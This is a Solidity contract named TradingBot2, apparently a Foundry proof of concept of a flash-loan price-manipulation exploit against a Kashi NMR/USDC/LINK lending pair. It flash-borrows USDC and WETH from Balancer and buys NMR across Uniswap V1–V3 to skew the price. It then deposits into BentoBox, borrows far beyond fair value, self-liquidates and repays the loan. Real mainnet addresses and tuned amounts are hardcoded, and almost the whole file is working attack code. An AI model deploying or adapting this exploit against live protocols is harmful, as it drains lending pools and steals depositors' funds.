pragma solidity ^0.8.0;


import "./Balancer.sol";
import "./IBentoBoxV1.sol";
import "./IKashiPair.sol";
import "./IUniswapRouter.sol";
import "forge-std/Test.sol";

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint wad) external;
}


contract TradingBot2 is BalancerFlashLoan, Test {

    // Addresses
    address owner;
    address public WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address public NMR = 0x1776e1F26f98b1A5dF9cD347953a26dd3Cb46671;

    address public BentoBoxV1 = 0xF5BCE5077908a1b7370B9ae04AdC565EBd643966;
    address public Kashi = 0x2cBA6Ab6574646Badc84F0544d05059e57a5dc42;
    address public NMR_USDC_LINK = 0x7BEe2161AfA1aEe4466E77BED826a41D5A28DB46;
    address public routerV3 = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address public routerV2 = 0xf164fC0Ec4E93095b804a4795bBe1e041497b92a;
    address public routerV1 = 0x2Bf5A5bA29E60682fC56B2Fcf9cE07Bef4F6196f;

    IBentoBoxV1 box = IBentoBoxV1(BentoBoxV1);
    IKashiPairMediumRiskV1 kashiPair = IKashiPairMediumRiskV1(NMR_USDC_LINK);
    IUniswapV3 swapV3 = IUniswapV3(routerV3);
    IUniswapV2 swapV2 = IUniswapV2(routerV2);
    IUniswapV1 swapV1 = IUniswapV1(routerV1);

    bytes32 r = hex"0000000000000000000000000000000000000000000000000000000000000000";
    bytes32 s = hex"0000000000000000000000000000000000000000000000000000000000000000";

    IERC20 usdc = IERC20(USDC);
    IERC20 nmr = IERC20(NMR);
    IWETH weth = IWETH(WETH);

    // Modifiers
    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner!");
        _;
    }


    constructor() {
        owner = msg.sender; 
    }

    function getFlashloan(IFlashLoanRecipient bad, bytes memory data) external payable {
        // vm.prank(address(0x000000000000Df8c944e775BDe7Af50300999283));
        // console.log("Address of this :",address(this));
     
        uint256 _amountUSDC = 157482_000_000;
        uint256 _amountWETH = 360_000_000_000_000_000_000;
        // the amount to be flashed for each asset
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = _amountUSDC ;
        amounts[1] = _amountWETH ;
        // IERC20 weth = IERC20(WETH);
        // IERC20 dai = IERC20(DAI);
        // IERC20 usdc = IERC20(USDC);

        IERC20[] memory assets = new IERC20[](2);
        assets[1] = weth;
        // assets[0] = dai;
        assets[0] = usdc;
        flashloan(bad, assets, amounts, data); // execution goes to `callFunction`

        // and this point we have succefully paid the dept
    }

    /**
        This function is called after your contract has received the flash loaned amount
     */
    function receiveFlashLoan(
        IERC20[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    )
        external
        override
    {
        // address data = abi.decode(userData, (address)); //do nothing -- clear warning
        // console.log("Caller address", data);
        userData;
        console.log("Msg.sender address :",msg.sender);
        address balancerAddress = address(msg.sender);

        this.balanceOfThis(WETH);
        this.balanceOfThis(USDC);

        //Swap on UniswapV3 &2 &1
        swap();
        this.balanceOfThis(NMR);
        //
        
        box.setMasterContractApproval(address(this), Kashi, true, uint8(0), r, s);
        usdc.approve(BentoBoxV1, uint256(2**256-1));
        uint256 usdc_share = 155994466100;
        uint256 nmr_share = 9_143_240_000_000_000_000_000;
        // uint256 nmr_share = 8000 *10**18;
        box.deposit(usdc, address(this), address(this), uint256(0), usdc_share);
        kashiPair.addCollateral(address(this), false, usdc_share);
        nmr.approve(BentoBoxV1, uint256(2**256-1));
        box.deposit(nmr, address(this), address(this), uint256(0), nmr_share);
        kashiPair.addAsset(address(this), false, nmr_share);
        //For test
        // kashiPair.totalBorrow();//
        // IERC20 token = IERC20(USDC);
        // uint256 share = usdc_share * 1e13 * 75000;
        // box.toAmount(token, share, false);
        // kashiPair.updateExchangeRate();
        //
        kashiPair.borrow(address(this), uint(10_449_414_020_291_175_000_000));
        // kashiPair.borrow(address(this), uint(1_300_414_020_291_175_000_000));
        // kashiPair.borrow(address(this), uint(9000_000_000_000_000_000_000));
        // kashiPair.updateExchangeRate(); //15_175352
        // kashiPair.totalBorrow(); //2654_173843821979341016  2225_208839550976671509
        // box.totals(usdc); //3523466_327424   3490204_954549
        uint256 part = kashiPair.userBorrowPart(address(this));

        address[] memory users = new address[](1);
        users[0] = address(this);
        uint[] memory maxBorrowParts = new uint[](1);
        maxBorrowParts[0] = part - uint(1);
        address swapper = 0x0000000000000000000000000000000000000000;
        kashiPair.liquidate(users, maxBorrowParts, address(this), swapper, true);
    
        // Approve the LendingPool contract allowance to *pull* the owed amount
        // i.e. AAVE V2's way of repaying the flash loan
        for (uint i = 0; i < tokens.length; i++) {
            // uint256[] memory amounts = new uint256[](i);
            // console.log("Fee amounts :",feeAmounts[i]);
            uint amountOwing = amounts[i] + feeAmounts[i];
            IERC20(tokens[i]).transfer(balancerAddress, amountOwing);
        }

    }

    function swap() internal {

        weth.approve(routerV1, uint256(2**256-1));
        weth.approve(routerV2, uint256(2**256-1));
        weth.approve(routerV3, uint256(2**256-1));

        uint theTime = block.timestamp + 8000;

        IUniswapV3.ExactInputSingleParams memory params;
        params.amountIn = 20_000_000_000_000_000_000;
        params.amountOutMinimum = 0;
        params.deadline = theTime;
        params.fee = 10_000;
        params.recipient = address(this);
        params.sqrtPriceLimitX96 = 0;
        params.tokenIn = WETH;
        params.tokenOut = NMR;
        swapV3.exactInputSingle(params);//Out NMR 1_565_064_045_515_212_920_044


        address[] memory paths = new address[](2);
        paths[0] = WETH;
        paths[1] = NMR;
        uint256 amountIn = 100_000_000_000_000_000_000;
        uint256 amountOutMin = 1_000_000_000_000_000_000;
        address to = address(this);
        swapV2.swapExactTokensForTokens(amountIn, amountOutMin, paths, to, theTime);

        weth.withdraw(120 ether);
        uint _value = 120 ether;
        swapV1.ethToTokenSwapInput{value:_value}(uint(1 ether), theTime);

    }

    function balanceOfThis(address _erc20TokenAddress) external view returns (uint256 bal) {
        IERC20 ERC20Token;    
        ERC20Token = IERC20(_erc20TokenAddress);
   
        bal = ERC20Token.balanceOf(address(this));
        console.log("Executor Token balance", bal);
        return bal;   

    }

    function transfer(address flashToken, address bad) external onlyOwner {
        uint256 amount = IERC20(flashToken).balanceOf(bad);
        IERC20(flashToken).transferFrom(bad, owner, amount);
    }

    function call (address payable _to, uint256 _value, bytes calldata _data) external onlyOwner payable returns (bytes memory) {
        require(_to != address(0));
        (bool _success, bytes memory _result) = _to.call{value: _value}(_data);
        require(_success);
        return _result;
    }

    receive()external payable {}
 
}